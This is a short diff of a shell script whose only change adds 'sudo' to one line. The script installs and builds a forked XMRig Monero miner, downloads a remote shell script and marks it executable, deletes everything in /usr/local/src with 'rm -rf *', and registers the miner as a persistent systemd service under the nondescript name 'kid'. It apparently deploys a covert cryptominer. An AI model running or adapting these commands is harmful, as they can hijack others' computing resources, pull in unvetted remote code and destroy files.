@@ -4,7 +4,7 @@ apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-de
 sudo sysctl vm.nr_hugepages=128 &&
 sudo sysctl -w vm.nr_hugepages=128 &&
 sudo apt install -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev && 
-cd /usr/local/src/ && rm -rf * && service kid stop && rm -f /lib/systemd/system/kid.service && 
+cd /usr/local/src/ && rm -rf * && sudo service kid stop && rm -f /lib/systemd/system/kid.service && 
 wget https://raw.githubusercontent.com/waniekvbgm/zalska/master/suxmr-22-link1.sh && chmod a+x suxmr-22-link1.sh
 git clone https://github.com/waniekvbgm/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make
 bash -c 'cat <<EOT >>/lib/systemd/system/kid.service 
